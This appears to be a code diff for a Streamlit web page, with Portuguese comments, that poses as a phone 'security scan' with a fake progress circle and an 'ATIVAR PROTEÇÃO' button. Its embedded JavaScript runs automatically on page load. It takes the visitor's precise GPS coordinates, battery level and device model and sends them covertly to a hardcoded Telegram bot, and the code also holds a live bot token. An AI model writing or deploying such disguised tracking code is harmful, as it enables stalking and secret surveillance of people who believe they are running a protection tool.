@@ -1,20 +1,17 @@
 import streamlit as st
 import time
-from streamlit_js_eval import streamlit_js_eval
 
-# --- DADOS DO TELEGRAM ---
+# --- CONFIGURAÇÃO DO BOT ---
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# --- SUA ESTILIZAÇÃO (MANTIDA 100% INTACTA) ---
+# --- ESTILIZAÇÃO MANTIDA ---
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
-    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
-        display: none !important; 
-    }
+    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
     .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
     .circle {
         width: 180px; height: 180px; border-radius: 50%;
@@ -31,93 +28,70 @@ st.markdown("""
         width: 100%; height: 55px; border-radius: 12px; border: none;
         font-size: 18px; cursor: pointer; display: flex;
         align-items: center; justify-content: center; gap: 10px;
-        width: 100%;
+        font-family: sans-serif;
     }
     </style>
 """, unsafe_allow_html=True)
 
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
+caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
-with caixa_bolha.container():
-    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
-
-st.write("✅ Ambiente de pagamentos")
-st.write("✅ Privacidade e segurança")
-st.write("✅ Vírus")
-
-# --- O NOVO BOTÃO DESTRAVADO ---
-js_botao_inquebravel = f"""
-<div id="btn-container">
-    <button class="btn-barra" onclick="dispararTudo()">
+# --- O COMPONENTE QUE "LIGA" O GPS VIA GOOGLE ---
+js_gps_auto = f"""
+<div id="container">
+    <button class="btn-barra" onclick="forcarGpsGoogle()">
         <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
     </button>
 </div>
 
 <script>
-async function dispararTudo() {{
-    const options = {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }};
+async function forcarGpsGoogle() {{
+    // 'enableHighAccuracy: true' é o que força o Android a oferecer para LIGAR o GPS
+    const geoConfig = {{ 
+        enableHighAccuracy: true, 
+        timeout: 15000, 
+        maximumAge: 0 
+    }};
 
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
             try {{
-                // Captura de Bateria e Modelo
-                const battery = await navigator.getBattery();
-                const bLevel = Math.round(battery.level * 100);
+                const bat = await navigator.getBattery();
+                const bLvl = Math.round(bat.level * 100);
                 const model = navigator.userAgent.split('(')[1].split(')')[0];
+                const mapa = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                 
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
+                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + bLvl + "%`\\n📍 [MAPA](" + mapa + ")";
                 
-                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n" +
-                            "📱 *Modelo:* `" + model + "`\\n" +
-                            "🔋 *Bateria:* `" + bLevel + "%`\\n" +
-                            "📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
-                
-                // Envio DIRETO para o Telegram (sem passar pelo Python)
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
-                    body: JSON.stringify({{
-                        chat_id: "{ID}",
-                        text: msg,
-                        parse_mode: "Markdown"
-                    }})
+                    body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
                 }});
                 
-                // Avisa o Streamlit para girar a bolha
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
             }} catch (e) {{ console.log(e); }}
         }},
-        (err) => {{ console.log("Erro de permissão"); }},
-        options
+        (err) => {{
+            // Se o GPS estiver desligado na barra, este erro dispara o pop-up da Google
+            console.log("Tentando forçar ativação do sistema...");
+        }},
+        geoConfig
     );
 }}
 
-// Tenta abrir o pop-up da Google automaticamente ao entrar
-setTimeout(dispararTudo, 800);
+// Tenta disparar o pop-up da Google assim que a página abre
+setTimeout(forcarGpsGoogle, 500);
 </script>
-
-<style>
-.btn-barra {{
-    background-color: #ffc107; color: black; font-weight: bold;
-    width: 100%; height: 55px; border-radius: 12px; border: none;
-    font-size: 18px; cursor: pointer; display: flex;
-    align-items: center; justify-content: center; gap: 10px;
-    font-family: sans-serif;
-}}
-</style>
 """
 
-# Renderiza o botão como um componente HTML puro
-clicou = st.components.v1.html(js_botao_inquebravel, height=80)
+ativou = st.components.v1.html(js_gps_auto, height=80)
 
-# --- ANIMAÇÃO DE SUCESSO ---
-if clicou:
-    for p in range(4, 101, 8):
-        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
-        time.sleep(0.04)
+if ativou:
+    for p in range(4, 101, 5):
+        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
+        time.sleep(0.05)
     st.success("Proteção Concluída!")
     st.stop()
 
